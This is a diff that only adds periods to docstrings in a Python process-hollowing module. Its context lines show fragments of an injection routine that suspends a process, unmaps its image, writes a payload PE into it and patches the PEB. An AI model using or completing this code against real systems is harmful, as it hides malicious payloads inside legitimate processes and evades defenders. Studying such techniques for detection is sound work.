@@ -1,4 +1,4 @@
-"""Process Hollowing implementation for advanced code injection
+"""Process Hollowing implementation for advanced code injection.
 
 Copyright (C) 2025 Zachary Flint
 
@@ -49,7 +49,7 @@ IMAGE_REL_BASED_DIR64 = 10
 
 
 class ProcessHollowing(BaseWindowsPatcher):
-    """Process Hollowing - replace process memory with malicious code"""
+    """Process Hollowing - replace process memory with malicious code."""
 
     def __init__(self):
         """Initialize the process hollowing injector with Windows and pefile validation."""
@@ -66,7 +66,7 @@ class ProcessHollowing(BaseWindowsPatcher):
         return ["kernel32", "ntdll"]
 
     def hollow_process(self, target_exe: str, payload_path: str) -> bool:
-        """Perform process hollowing
+        """Perform process hollowing.
 
         Args:
             target_exe: Path to legitimate executable to hollow
@@ -207,28 +207,28 @@ class ProcessHollowing(BaseWindowsPatcher):
             return False
 
     def _create_suspended_process(self, exe_path: str) -> dict | None:
-        """Create a process in suspended state"""
+        """Create a process in suspended state."""
         from ...utils.system.windows_structures import WindowsProcessStructures
 
         structures = WindowsProcessStructures()
         return structures.create_suspended_process(exe_path)
 
     def _get_thread_context(self, thread_handle: int) -> Any | None:
-        """Get thread context"""
+        """Get thread context."""
         from ...utils.system.windows_structures import WindowsContext
 
         context_helper = WindowsContext()
         return context_helper.get_thread_context(thread_handle)
 
     def _set_thread_context(self, thread_handle: int, context: Any) -> bool:
-        """Set thread context"""
+        """Set thread context."""
         from ...utils.system.windows_structures import WindowsContext
 
         context_helper = WindowsContext()
         return context_helper.set_thread_context(thread_handle, context)
 
     def _get_peb_address_from_context(self, context: Any) -> int:
-        """Get PEB address from thread context"""
+        """Get PEB address from thread context."""
         try:
             if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                 # PEB is at GS:[0x60]
@@ -241,7 +241,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             return 0
 
     def _read_image_base_from_peb(self, process_handle: int, peb_addr: int) -> int:
-        """Read image base from PEB"""
+        """Read image base from PEB."""
         try:
             if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                 image_base_offset = 0x10
@@ -268,7 +268,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             return 0
 
     def _write_image_base_to_peb(self, process_handle: int, peb_addr: int, new_base: int) -> bool:
-        """Write new image base to PEB"""
+        """Write new image base to PEB."""
         try:
             if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                 image_base_offset = 0x10
@@ -293,7 +293,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             return False
 
     def _unmap_view_of_section(self, process_handle: int, base_addr: int) -> bool:
-        """Unmap a section from process"""
+        """Unmap a section from process."""
         try:
             # NtUnmapViewOfSection
             status = self.ntdll.NtUnmapViewOfSection(process_handle, base_addr)
@@ -307,7 +307,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             return False
 
     def _allocate_memory(self, process_handle: int, preferred_addr: int, size: int) -> int:
-        """Allocate memory in target process"""
+        """Allocate memory in target process."""
         try:
             allocated = self.kernel32.VirtualAllocEx(
                 process_handle,
@@ -336,7 +336,7 @@ class ProcessHollowing(BaseWindowsPatcher):
     def _write_headers(
         self, process_handle: int, base_addr: int, payload_data: bytes, payload_pe: Any
     ) -> bool:
-        """Write PE headers to target process"""
+        """Write PE headers to target process."""
         try:
             headers_size = payload_pe.OPTIONAL_HEADER.SizeOfHeaders
             bytes_written = ctypes.c_size_t(0)
@@ -358,7 +358,7 @@ class ProcessHollowing(BaseWindowsPatcher):
     def _write_sections(
         self, process_handle: int, base_addr: int, payload_data: bytes, payload_pe: Any
     ) -> bool:
-        """Write PE sections to target process"""
+        """Write PE sections to target process."""
         try:
             for section in payload_pe.sections:
                 section_addr = base_addr + section.VirtualAddress
@@ -387,7 +387,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             return False
 
     def _process_relocations(self, process_handle: int, new_base: int, payload_pe: Any) -> bool:
-        """Process PE relocations for new base address"""
+        """Process PE relocations for new base address."""
         try:
             if not hasattr(payload_pe, "DIRECTORY_ENTRY_BASERELOC"):
                 return True  # No relocations needed
@@ -441,7 +441,7 @@ class ProcessHollowing(BaseWindowsPatcher):
 
 
 def perform_process_hollowing(target_exe: str, payload_exe: str) -> bool:
-    """Convenience function to perform process hollowing
+    """Convenience function to perform process hollowing.
 
     Args:
         target_exe: Path to legitimate executable
